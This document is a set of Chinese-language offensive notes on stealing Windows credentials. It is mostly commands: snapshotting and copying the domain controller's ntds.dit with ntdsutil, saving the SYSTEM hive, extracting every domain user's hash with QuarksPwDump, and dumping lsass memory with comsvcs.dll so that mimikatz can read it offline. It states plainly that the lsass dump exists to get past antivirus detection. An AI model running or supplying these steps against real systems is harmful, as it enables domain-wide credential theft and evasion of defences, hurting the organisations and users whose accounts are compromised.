Hashdump(Meterpreter)

导出域Hash

Windows的密码是经过hash后存储的，本地存放在hklm\sam以及hklm\system注册表中，域里面是存放在域控制器的c:\windows\ntds\ntds.dit中

创建快照

ntdsutil snapshot "activate instance ntds" creat quit quit

挂载快照

ntdsutil snapshot "mount {快照id}" quit quit

复制ntds.dit到本地：

copy 装载位置\windows\NTDS\ntds.dit C:\ntds.dit

解除挂载：

ntdsutil snapshot "unmount {快照id}" quit quit

删除快照：

ntdsutil snapshot "delete {快照id}" quit quit

开始解密，首先通过注册表的方式获取KEY

reg save HKLM\SYSTEM c:\windows\temp\sys.hiv

获取到ntds.dit和system.hiv之后 便可以使用工具导出域内所有用户的哈希

QuarksPwDump

QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\sys.hiv -o c:\pass.txt

pip3 install impacket

Lsass 内存转储

目标主机存在杀软的情况下大概率会拦截使用mimikatz进行内存凭据导出的行为和杀掉mimikatz程序，这种情况下可以不直接在目标主机上获取hash，使用系统api或程序将lsass进程的内存转储出来，下载到本地使用mimikatz加载内存文件读取hash，绕过防护软件的拦截
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full

comsvcs.dll

调用系统自带的comsvcs.dll 文件，需要通过powershell执行

需要开启SeDebugPrivilege权限，管理员权限的cmd下，默认支持SeDebugPrivilege权限，但是状态为Disabled，而管理员权限powershell下默认支持并且开启

powershell -c "rundll32 C:\windows\system32\comsvcs.dll MiniDump <pid> C:\test\lsass.dmp full"

为何Psh（.Net）打开SeDebugPrivilege特权：

https://github.com/dotnet/corefx/blob/master/src/System.Diagnostics.Process/src/System/Diagnostics/ProcessManager.Windows.cs#L141

如何在没有特权的情况下，使用Psh开启SeDebugPrivilege特权：

https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1#L121
